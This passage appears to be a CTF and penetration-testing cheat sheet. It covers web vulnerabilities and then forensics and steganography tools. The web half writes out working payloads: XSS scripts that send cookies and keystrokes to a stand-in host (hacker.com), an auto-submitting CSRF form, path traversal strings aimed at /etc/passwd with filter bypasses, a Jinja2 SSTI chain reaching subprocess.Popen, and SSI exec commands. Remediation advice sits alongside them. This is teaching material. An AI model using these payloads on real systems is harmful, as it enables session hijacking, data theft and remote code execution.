Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker.

This can be seen here:  
```php
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```
Because the above PHP code example uses three equals signs (===), it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting /adMin will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks.

**Example:**   
A login process: that goes like step 1, 2, 3, 4 but the hacker make it go like 1, 4 which grants the hacker access to another users account.

**Case:**  
Reset another users password and get the link for the reset process to your account. The design flaw here is that you can send a reset password request to support by passing a users name, and then entering your own email to get the link. This can be done by the following command:

`curl '<url>/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=berkan@hacker.com'`

### Cookie Tampering
Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges

The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:
```
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/
```
Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.

For this, curl can be used by using:  
`curl -H "Cookie: logged_in=true; admin=true" <ip_address>/cookie-test` 

**Hashed cookies**  
Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text. Here are some examples that you may come across:

| Original String | Hash Method | Output |
|:---:|:---:|---|
| 1 | md5 | c4ca4238a0b923820dcc509a6f75849b |
| 1 | sha-256 | 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b |
| 1 | sha-512 | 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a |
| 1 | sha1 | 356a192b7913b04c54574d18c28d46e6395428ab |

You can see from the above table that the hash output from the same input string can significantly differ depending on the hash method in use. Even though the hash is irreversible, the same output is produced every time

**Encoded cookies**  
Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible

Take the below data as an example which is set by the web server upon logging in:
`Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/` 

This string base64 decoded has the value of `{"id":1,"admin": false}` we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.
## Insecure Direct Object Reference
Insecure Direct Object Reference(IDOR) is a type of access control vulnerability.

This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.

**An example of this:**  
Imagine you've just signed up for an online service, and you want to change your profile information. The link you click on goes to `http://shop.berkankutuk.dk/profile?user_id=1337`, and you can see your information.

Curiosity gets the better of you, and you try changing the user_id value to 420 instead (`http://shop.berkankutuk.dk/profile?user_id=420`), and to your surprise, you can now see another user's information. You've now discovered an IDOR vulnerability!
## File Inclusion (LFI/RFI)
In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input. The following graph explains and breaking down the essential parts of the URL.
![LFI](Images/LFI.png)

For example, if a user wants to access and display their CV within the web application, the request may look as follows, `http://webapp.thm/get.php?file=userCV.pdf`, where the `file` is the parameter and the `userCV.pdf`, is the required file to access.
![LFI CV](Images/LFI-CV.png)

File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and implemented. The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.

If the attacker somehow can write to the server such as `/tmp` directory, then it is possible to gain remote command execution RCE. However, it won't be effective if file inclusion vulnerability is found with no access to sensitive data and no writing ability to the server.

Also known as Directory traversal, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.

An example of this can be seen by running this command on a website with this vulnerability:  
`http://webapp.thm/get.php?file=../../../../etc/passwd`

The result would look like this:  
![LFI Path](Images/LFI-Path.png)

Another vulnerable code example in PHP:  
```php
<?PHP 
	include($_GET["file"]);
?>
```

Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths

You can find a list of common OS files [here](More/Vulnerabilities/OS-Files/Readme.md)

Most of the time in CTF's the path you are looking for would be: `../../../../etc/passwd`

### NULL BYTE trick
If a path is placing `.php` at the end of your search, then this tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is `%00`.

Using null bytes is an injection technique where URL-encoded representation such as `%00` or `0x00` in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.:  
`/etc/passwd%00`

**NOTE**: the `%00` trick is fixed and not working with PHP 5.3.4 and above.

### Current Directory trick
Though this can be filtered by the developer. But we can also bypass that by trying the "current directory" trick which looks something like this:  
`/etc/passwd/.`

### Subset string trick
If the developer uses input validation by filtering some keywords, ex. "../", we can bypass this by using:    
`....//....//....//....//....//etc/passwd`  
This works because the PHP filter only matches and replaces the first subset string `../` it finds and doesn't do another pass, leaving:  
`../../../../etc/passwd`

### Including the Directory trick
If the developer forces you to include a directory, you can bypass this by writing the directory and then moving up from there. Ex. if the forced directory is 'language':  
`languages/../../../../../etc/passwd` 

### Remote File Inclusion - RFI
Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into `include` function. One requirement for RFI is that `the allow_url_fopen` option needs to be `on`. 

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:

* Sensitive Information Disclosure 
* Cross-site Scripting (XSS)
* Denial of Service (DoS)

An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.
![RFI](Images/RFI.png)

**How to**  
1. Create a file somewhere on your local computer. ex "cmd.txt"
2. Open the file and write some code inside it
3. Now create a webserver using python by running: `python3 http.server <port>` in the same path of the file.
4. Now open the browser and enter the http address where you want the attack to direct. This could look like this: `http://10.10.135.181:9001/cmd.txt` 

### Remediation
As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:

1. Keep system and services, including web application frameworks, updated with the latest version.
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.
7. Implement whitelisting for file names and locations as well as blacklisting.

### PHP Filters
PHP filters are used to validate and sanitize external input. The filter extension provides a way to validate and sanitize external inputs. The filter extension is not enabled by default, so you need to enable it in the php.ini file.

Filters can be used by using `php://filter`. For example, to base64 encode a file, you can use:  
`php://filter/convert.base64-encode/resource=index.php`
## Cross Site Request Forgery (CSRF)
CSRF tricks users into performing actions on a web application where they're authenticated without their knowledge.

**How CSRF Works:**
1. User logs into vulnerable site (bank.com)
2. User visits malicious site (evil.com)
3. Malicious site triggers request to bank.com using user's session
4. Bank.com processes request as if user intended it

**Example Attack:**
```html
<!-- Hidden form that auto-submits -->
<form action="https://bank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- Or using img tag -->
<img src="https://bank.com/delete_account?confirm=yes">
```

**Detection:**
- Look for state-changing requests without CSRF tokens
- Check if anti-CSRF measures can be bypassed
- Test with different HTTP methods (GET, POST, PUT)

**Prevention:**
- CSRF tokens in forms
- SameSite cookie attribute
- Referer header validation
- Double submit cookies
## Cross Site Scripting (XSS)
Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users

Cross-site scripting vulnerabilities are extremely common

### DOM-Based XSS 
DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source

This is when an attack payload is executed by manipulating the DOM (Document Object Model) in the target's browser. This type uses the client-side code instead of server-side code.

**Exploiting the DOM**  
DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

**Example Scenario:**  
The website's JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

**Potential Impact:**
Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

**How to test for Dom Based XSS:**
DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "`window.location.x`" parameters.

When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval()

### Reflected XSS 
This is when a malicious script bounces off another website onto the target's web application or website. Normally, these are passed in the URL as a query, and it's easy as making the target click a link. This type originates from the target's request.

Or in other words, reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

**Example Scenario:**  
A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source.

**How to test for Reflected XSS**  
You'll need to test every possible point of entry; these include:
* Parameters in the URL Query String
* URL File Path
* Sometimes HTTP Headers (although unlikely exploitable in practice)

A small test to see if a reflected XSS is possible is to enter a single quote (`'`) into the input field and see if the page breaks or shows an error message. If it does, then it's likely exploitable.

Another way to test for reflected XSS is to enter the following payload into the input field:  
```html
 "><script>alert("exploitable")</script> 
``` 
If the page shows an alert box saying "exploitable", then it's likely exploitable.

### Stored XSS
As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

**Example Scenario:**  
A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

**How to test for Stored XSS:**  
You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:
* Comments on a blog
* User profile information
* Website Listings

### Blind XSS
Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

**Example Scenario:**
A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

**Potential Impact:**
Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.

**How to test for Blind XSS:**
When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

A popular tool for Blind XSS attacks is [xsshunter](https://xsshunter.com). Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

### Payload
In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.

The intention is what you wish the JavaScript to actually do, and the modification is the changes to the code we need to make it execute as every scenario is different.

### Some examples of XSS intentions.
**Proof Of Concept:**  
This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:  
```html
<script>alert('XSS');</script>
```

**Session Stealing:**  
Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.  
```html
<script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>
```

**Key Logger:**  
The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.  
```html
<script>document.onkeypress = function(e) { fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>
```

**Business Logic:**  
This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this: 
```html
<script>user.changeEmail('attacker@hacker.com');</script>
```

### A command to rule them all (Polyglots)
An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. 

This command will print "BERKAN_WAS_HERE" on the screen.
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('BERKAN_WAS_HERE') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('BERKAN_WAS_HERE')//>\x3e 
```
## Server Side Request Forgery (SSRF)
SSRF, or server-side request forgery, is a security vulnerability that occurs when an attacker tricks a web application into making unauthorised requests to internal or external resources on the server's behalf.

### Types of Attacks
- **Basic SSRF:** The attacker sends crafted requests from the vulnerable server to internal or external resources, such as accessing files or databases not intended for public access.
- **Blind SSRF:** Attackers don't directly see responses but infer information from response times or error message changes.
- **Semi-blind SSRF:** Attackers don't receive direct responses but use clues like changes in application behavior or response times to gauge success.

**What's the impact?**  
A successful SSRF attack can result in any of the following: 

* Access to unauthorised areas.
* Access to customer/organisational data.
* Ability to Scale to internal networks.
* Reveal authentication tokens/credentials.

### Finding an SSRF
- **Identifying Vulnerable Input:** Attackers find input fields within the application, like URL parameters in web forms or API endpoints, which can be manipulated to trigger server-side requests.
  ```html
  <a href="/download?server:8087=secure-file-storage.com&id=75482342">Download</a>
  <!-- Replace the server IP with an attacker-controlled server -->
  <a href="/download?10.10.116.118:1234&id=75482342">Download</a>
  ```
  And then wait for the server to make a request to the attacker-controlled server.
  ```r
  nc -lvnp 1234
  ```
- **Manipulating the Input:** Attackers input malicious URLs or payloads to cause the application to make unintended requests, such as pointing to internal servers or external ones controlled by the attacker.
  ```html
  <input type="hidden" name="server" value="=http://server.website.com/store">
  ```
- **Requesting Unauthorized Resources:** The application server, unaware of the malicious input, makes requests to the specified URLs or resources, potentially targeting internal or sensitive services.
  ```txt
  https://berkankutuk.dk/form?server=http://server.website.com/store
  ```
- **Exploiting the Response:** Attackers exploit the responses from malicious requests to gather valuable information like internal server data, credentials, or pathways for further exploitation. Directory traversal and `&x=` can also be used in some cases to manipulate paths.

### Defeating Common SSRF Defenses
1. **Deny List Bypass:**
   - Deny lists typically block access to localhost or specific IP addresses like 127.0.0.1. However, attackers can bypass these restrictions by using alternative references such as 0, 0.0.0.0, 127.1, or subdomains that resolve to localhost like 127.0.0.1.nip.io.
2. **Allow List Circumvention:**
   - Allow lists may restrict URLs to start with `https://website.com`, but attackers can evade this control by creating subdomains on their own domain, like `https://website.com.attackers-domain.com`, thus gaining control over internal HTTP requests.
3. **Exploiting Open Redirects:**
   - Open redirects, which automatically redirect users to another website, can be leveraged by attackers to redirect internal HTTP requests to a domain of their choice, especially if SSRF vulnerabilities have stringent rules allowing only specific URLs like `https://website.com/`.

## Server Side Template Injection (SSTI)
Server-Side Template Injection (SSTI) is a vulnerability that occurs when an attacker can control the template processing engine on the server-side. This allows the attacker to inject and execute code on the server.

**Example of SSTI in Python Flask**

```python
from flask import Flask, render_template_string
app = Flask(__name__)

@app.route("/profile/<user>")
def profile_page(user):
    template = f"<h1>Welcome to the profile of {user}!</h1>"

    return render_template_string(template)

app.run()
```

In the above code, the `render_template_string` function is used to render the template. If the `user` input is not sanitized, an attacker can inject template code to execute arbitrary commands on the server.

For example, if the attacker sends the following request: `http://website.com/profile/{{7*7}}`, the server will render the template as `<h1>Welcome to the profile of 49!</h1>`. This shows that the server is executing the code provided by the attacker.


### Finding an SSTI
- **Identifying Vulnerable Input:** Attackers look for input fields within the application that are used to render templates, such as user profiles or comments, which can be manipulated to trigger SSTI.
- **Fuzzing:** Most template engines will use a similar character set for their "special functions" which makes it relatively quick to detect if it's vulnerable to SSTI. Those are `${{<%[%'"}}%`. To manually fuzz all of these characters, they can be sent one by one following each other.

<details>
<summary>Manual Fuzzing example</summary> <br>

  ```python
  "http://10.10.118.110:5000/profile/$"
  "http://10.10.118.110:5000/profile/$\{"
  "http://10.10.118.110:5000/profile/${{"
  "http://10.10.118.110:5000/profile/${{<"
  ```

  One of these may yield an error message or a different response, indicating that the application is vulnerable to SSTI.

</details>

### Detecting Template Engines
In the best case scenario, the error message will include the template engine, which marks this step complete. However, if this is not the case, we can use a decision tree to help us identify the template engine:

![SSTI](Images/SSTI.webp)
- Green arrow - The expression evaluated (i.e 42)
- Red arrow - The expression is shown in the output (i.e ${7*7})

### Exploiting SSTI
Once the template engine is identified, we can use the documentation to exploit the SSTI vulnerability. For this [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) is a great resource.

<details>
<summary>Exploitation POC for Jinja2</summary> <br>
Python allows us to call the current class instance with <code>.__class__</code>, we can call this on an empty string:

```txt
http://10.10.118.110:5000/profile/{{ ''.__class__ }}.
```

Classes in Python have an attribute called <code>.\_\_mro\_\_</code> that allows us to climb up the inherited object tree:

```txt
http://10.10.118.110:5000/profile/{{ ''.__class__.__mro__ }}.
```	

Since we want the root object, we can access the second property (first index):

```txt
http://10.10.118.110:5000/profile/{{ ''.__class__.__mro__[1] }}.
```	

Objects in Python have a method called <code>.\_\_subclassess\_\_</code> that allows us to climb down the object tree:

```txt
http://10.10.118.110:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}.
```	

Now we need to find an object that allows us to run shell commands. **Example**: The position in the list is 400 (index 401):

```txt
http://10.10.118.110:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401] }}.
```	

The above payload essentially calls the subprocess.Popen method, now all we have to do is invoke it (use the code above for the syntax)

```txt
http://10.10.118.110:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}.
```	

</details>

### Remediation
To prevent SSTI vulnerabilities, developers should make use of secure methods and sanitization techniques.

<details>
<summary>Secure Methods</summary>

Most template engines will have a feature that allows you to pass input in as data, rather that concatenating input into the template.

```python
# Insecure: Concatenating input
template = f"<h1>Welcome to the profile of {user}!</h1>"
return render_template_string(template)

# Secure: Passing input as data
template = "<h1>Welcome to the profile of {{ user }}!</h1>"
return render_template_string(template, user=user)
```
</details>

<details>
<summary>Sanitization</summary>

Creating a whitelist character set for user input can help prevent SSTI vulnerabilities. This can be done by checking the input against a list of allowed characters using a regular expression.

```python
import re

# Remove everything that isn't alphanumeric
user = re.sub("^[A-Za-z0-9]", "", user)
template = "<h1>Welcome to the profile of {{ user }}!</h1>"
return render_template_string(template, user=user)
```
</details>

## Server Side Includes (SSI)
Server Side Includes (SSI) is a simple interpreted server-side scripting language used almost exclusively for the Web. It is most useful for including the contents of one or more files into a web page on a web server, using its #include directive.

### Finding an SSI
* `<!--#exec cmd="ls" -->`
* `<!--#echo var="DATE_LOCAL" -->`
* `<!--#exec cmd="cat /etc/passwd" -->`

# Digital Forensics
Digital forensics is the art of uncovering and investigating electronically stored data. It involves identifying, acquiring, analyzing, and reporting digital evidence.

**Use Cases:**
- Uncover hidden data in files or metadata.
- Recover lost or deleted data.
- Reconstruct corrupted files.
- Identify file formats and structures.
- Analyze network logs or memory dumps to trace events.
- Crack password hashes for further investigation.
## File Analysis
### Encodings
* **Decimal:** 70 111 114 101 110 115 105 99 115 33
* **Hex:** 46 6f 72 65 6e 73 69 63 73 21
* **Octal:** 106 157 162 145 156 163 151 143 163 41
* **ASCII:** Forensics!
* **Base64:** Rm9yZW5zaWNzIQ==
* **Base85:** 7W3<YDKBN%F!1

### File type
The file type is often indicated by the file extension in the file name, e.g. .png, .mp4
* Typically what the OS uses to assess how to open / interpret the file
* Do not rely on extensions! Can be modified to trick the OS into misinterpreting data

The file type is indicated in the contents of the file with a file signature - a magic number
* Hex string at a specific offset
* Eg PNG files: 89 50 4e 47 (last three hex is PNG in ASCII)
* Tool: `file`

**pngcheck**  
A command-line tool for "checking" a PNG image file. Especially good for verifying checksums.

<details>
<summary>Combining two images</summary>

```python
from PIL import Image
import numpy as np

# Load the images based on the provided file names
img1 = Image.open('/mnt/data/scrambled1.png')
img2 = Image.open('/mnt/data/scrambled2.png')

# Convert the images to numpy arrays
img_data1 = np.asarray(img1)
img_data2 = np.asarray(img2)

# Perform the element-wise addition of the two images' data
# Since the data type of PIL images is unsigned integer 8 bits,
# the result must be clipped to be in the range [0, 255]
data = np.add(img_data1, img_data2, dtype=np.uint8)

# Create a new image from the combined data
new_image = Image.fromarray(data)

# Save the result image
result_path = "/mnt/data/out.png"
new_image.save(result_path, "PNG")

# Provide the path for downloading the result
result_path
```
</details>

### Metadata
The file extension is one form of metadata: (data about data)

Additional information about a file in addition to the content itself
* General: File name, extension, size, time of origin, permissions
* Specific: GPS data in images, number of frames in GIF, CPU architecture in executables, etc.

Why analyze metadata?
* Can store important info - maybe even info that should have been hidden
* In some cases even more important than content - eg with encrypted HTTPS traffic
* Tool: `exiftool`

**Log Analysis**  
Log files are a record of events that happen on a system. They are used to record everything from user activity to system events. Log files are used to track and record the activities of users, processes, and applications on a system.

In order to effectively analyze log files and identify any suspicious activity, it is important to understand the structure of the log files and the type of information they contain. See [Log Analysis](more/Log%20Analysis/Readme.md) for more.

**PDF Analysis**  
We can try to read the metadata using the program `pdfinfo`. Pdfinfo displays various metadata related to a PDF file, such as title, subject, author, creator, and creation date. If you don’t have `pdfinfo` installed, you can install it using: `sudo apt install poppler-utils`

If the PDF file is password protected, another tool named `pdfcrack` can be used with a wordlist in order to bruteforce the password.

**Example:**  
`pdfcrack -q -w /usr/share/wordlists/rockyou.txt encrypted.pdf`

**Geographical Coordinates**  
Longitude Latitude

Can be written as:
```
51 deg 30' 51.90" N, 0 deg 5' 38.73" W

replaced deg with °
51° 30' 51.90" N, 0° 5' 38.73" W

or simply 51.514417, -0.094092
``` 

### File format
A file type has a specific format - the structure of the file

Typical structure
* Signature file - magic number

Header - typical info to be used to understand the content (metadata)
* Possibly meta data
* Data
* Trailer that completes the file

The format is precisely defined in a specification doc - often publicly available
* Corrupted files: compare file with specification, correct differences with hex editor
* Unknown file types: search for tracks from a file format 

## PCAP Analysis
Analyze network packet captures to understand traffic patterns and identify security issues.

**Common Tools:**
- Wireshark (GUI analysis)
- tshark (command line)
- tcpdump (capture packets)

**Analysis Techniques:**
```bash
# Basic filtering
tshark -r capture.pcap -Y "http"
tshark -r capture.pcap -Y "tcp.port == 80"
tshark -r capture.pcap -Y "ip.addr == 192.168.1.100"

# Extract specific data
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.uri
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command
```

**What to Look For:**
- Unusual traffic patterns
- Plain text credentials
- DNS exfiltration
- Malware communication
- Port scanning activities

## Steganography
Steganography is the practice of hiding a secret message in something that is not secret, for example: A message inside a jpg file, or a binary inside a png.

**File Carving**  
File carving: extract files based on the file format
* Look for file signatures, headers, trailers, etc.
* Originally used in connection with. extraction of files from disk images and memory dumps
* Useful for extracting files stored in other files in stego challenges

File carving tools:
* binwalk
* foremost
* dd (manual extraction)
  * dd if = input.png or = output.txt bs = 1 skip = 1000 count = 32 

**Tools**  
`Steghide` = JPEG(primarily), BMP, WAV and AU  
`Zsteg` = PNG(primarily), BMP

### Stegsnow
stegsnow is a program for concealing messages in text files by appending tabs and spaces (whitespace) on the end of lines, and for extracting messages from files containing hidden messages.

**Useful commands:**  
`stegsnow -C -m <message> -p <password> <inputfile> <outputfile>` compress a message in a text file and save it to a new file
`stegsnow -C -p <password> <inputfile> <outputfile>` uncompress a message in a text file and save it to a new file 

### Steghide
Steghide is a steganography program that hides data in various kinds of image and audio files, only supports these file formats : JPEG, BMP, WAV and AU. But it’s also useful for extracting embedded and encrypted data from other files. One of the greatest benefits of stegohide, is that it can encrypt data with a passphrase 

Install steghide with `sudo apt install steghide`

**Useful commands:**  
`steghide info <filepath>`  displays info about whether a file has embedded data or not.  
`steghide extract -sf <filepath>`  extracts embedded data from a stegofile  
`steghide embed -cf <filepath> -ef <textfile>`  embed data from a coverfile to a embedfile  
`steghide info <filepath>`  displays total embeddable data size in the coverfile  

**Example:**  
Embed a zip file into a jpg file  
`steghide embed -cf original.jpg -ef test.zip`

### Stegsolve
Sometimes there is a message or a text hidden in the image itself and in order to view it you
need to apply some color filters or play with the color levels. You can do it with GIMP or
Photoshop or any other image editing software but stegsolve made it easier. It’s a small java tool that applies many color filters on images.

**Installation**
```bash
wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
```

And then run it with
```bash
java -jar bin/stegsolve.jar
```

### Stegseek
[Stegseek](https://github.com/RickdeJager/stegseek) is a lightning fast steghide cracker

After installing stegseek [here](https://github.com/RickdeJager/stegseek/blob/master/BUILD.md), you can use it to crack a password protected steghide file with the following command:
```bash
stegseek <file>
```

### Stegoveritas
Stegoveritas supports just about every image file, and is able to extract all types of data from it

**Installation:**
```console
berkankutuk@kali:~$ sudo pip3 install stegoveritas 
berkankutuk@kali:~$ stegoveritas_install_deps
```

**Useful commands:**   
`stegoveritas filename` - Simple stego scan   
`stegoveritas -meta filename` - Check file for metadata information  
`stegoveritas -steghide filename` -  Check for StegHide hidden info.  
`stegoveritas -extractLSB filename` -  Extract a specific LSB RGB from the image.

### Stego-toolkit
Collection of steganography tools - helps with CTF challenges


### Strings
Strings is a linux tool that displays printable strings in a file. That simple tool can be very helpful when solving stego & binary challenges. Usually the embedded data is password protected or encrypted and sometimes the password is actaully in the file itself and can be easily viewed by using strings. It’s a default linux tool so you don’t need to install anything.

**Useful commands:**  
`strings file`  displays printable strings in the given file  
`strings -el file` displays printable strings in the given file in little-endian format

### Exiftool
Sometimes important stuff is hidden in the metadata of the image or the file , exiftool can be
very helpful to view the metadata of the files.

**Useful commands:**   
`exiftool file`  shows the metadata of the given file  
`exiftool -Comment="something" file`  to add a comment to the metadata of the file

### Exiv2
A tool similar to exiftool.

**Useful commands:**  
`exiv2 file` shows the metadata of the given file  

### Binwalk
Binwalk is a tool for searching binary files like images and audio files for embedded files and data.

**Useful commands:**  
`binwalk <filepath>` Displays the embedded data in the given file  
`binwalk -e <filepath>` Displays and extracts the data from the given file

### Foremost
`foremost` is another file carving tool like binwalk, and can be installed with `sudo apt-get install foremost`.

**Useful commands:**  
Search for all file types in the given image file   
`foremost image.png`  

 Search for a selection of file types in the given image file (`-i image.dd`)   
`foremost -t doc,jpg,pdf,xls -i image.dd`

### Zsteg
zsteg is a tool that can detect hidden data in png and bmp files.

**Useful commands:**  
`zsteg file` Runs a simple scan on the given file  
`zsteg -a file` Runs all the methods on the given file  
`zsteg -E file` Extracts data from the given payload (example : zsteg -E b4,bgr,msb,xy
name.png)  
`zsteg -l 0 file` Limits the bytes checked to 0  

### Jsteg
Another command-line tool to use against JPEG Images

### Zbarimg
A command-line tool to quickly scan multiple forms of barcodes (QR Codes)

Install with `sudo apt install zbar-tools`

**Useful commands:**  
`zbarimg <filename>`

Alternatively, you can use a online tool like [zxing](https://zxing.org/w/decode.jspx) to decode QR codes.

### Wavsteg
WavSteg is a python3 tool that comes with the package `stegolsb` which can hide data and files in wav files and can also extract data from wav files.

**Useful commands:**  
`python3 WavSteg.py -r -i soundfile -o outputfile` extracts data from a wav sound file and
outputs the data into a new file

Use an online tool like [Databorder Morse](https://databorder.com/transfer/morse-sound-receiver/) or [Morse Code World](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) if the wav file contains morse code.

### Outguess
OutGuess is a universal tool for steganography that allows the insertion of hidden information into the redundant bits of data sources. The supported formats are JPEG, PPM and PNM.

**Useful commands:**  
To embed the message hidden.txt into the monkey.jpg image:  
`outguess -k "my secret pass phrase" -d hidden.txt monkey.jpg out.jpg`

Retrieve the hidden message from the image:   
`outguess -k "my secret pass phrase" -r out.jpg message.txt`

**Options:**   
`-k <key>`  key  
`-d <name>` filename of dataset  
`-p <param>`   parameter passed to destination data handler  
`-r`           retrieve message from data  

### Sonic visualizer
Sonic visualizer is a tool for viewing and analyzing the contents of audio files, however it can be
helpful when dealing with audio steganography. You can reveal hidden shapes in audio files or use it to se hidden images inside audio files.

`Layer->Add Spectrogram` should work

<details>
<summary>Making a spectrogram</summary>  

1. Create a small white text on a black background
2. Convert the text to audio using this [imagetoaudio](https://nsspot.herokuapp.com/imagetoaudio/) tool
3. Open Audacity and import the audio file. 
4. Select another track and import the audio file again
5. Now merge the two tracks by selecting the first track and then the second track and then `Tracks->Mix->Mix and Render`
6. Now select the mixed track and then `Tracks->Add New->Spectrogram`

Now you should see the hidden text in the spectrogram
</details>

### Zero-Width Characters
Zero-width characters are characters that have no width when displayed, but can be used to hide information in text. These characters are often used in steganography to hide messages in plain sight. A useful tool for detecting zero-width characters is [Unicode Steganography with Zero-Width Characters
](https://330k.github.io/misc_tools/unicode_steganography.html).
## Memory analysis
Traditionel computer forensics can be made out of volatile memory.

What is volatile data?
* Volatile data: non-permanent data, disappears when the power goes out
* Typically the contents of main memory RAM
* "Live box forensics"
* Analysis takes place on a memory dump - provides a snapshot 

Data that can be found in volatile memory
* Running processes and services
* Open files
* Network connections
* Run commands
* Passwords, keys
* Unencrypted data that is encrypted on disk but must be used in decrypted mode in memory
* Stateless malware - malware that lives only in memory
